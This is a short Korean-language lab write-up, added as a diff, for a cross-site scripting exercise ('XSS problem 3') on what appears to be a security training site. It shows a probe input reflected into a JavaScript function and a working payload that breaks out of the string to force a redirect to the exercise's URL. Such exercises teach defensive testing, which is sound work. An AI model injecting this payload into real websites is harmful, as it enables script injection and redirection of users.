@@ -1,0 +1,20 @@
+XSS 3번 문제
+
+이동해야 할 주소
+
+https://elms2.skinfosec.co.kr:8083/exam18/location.php
+
+1. 공격 포인트 확인
+
+입력 param: '"<>()XSS1
+
+	function fnEdit(){
+			document.location.href = 'noticeedit.php?board_id=' + ''&quot;&lt;&gt;()XSS1';
+		}
+
+
+2. 공격 구문
+
+	function fnEdit(){
+			document.location.href = 'noticeedit.php?board_id=' + ''} a();function a(){location.href = 'https://elms2.skinfosec.co.kr:8083/exam18/location.php';a()'';
+		}
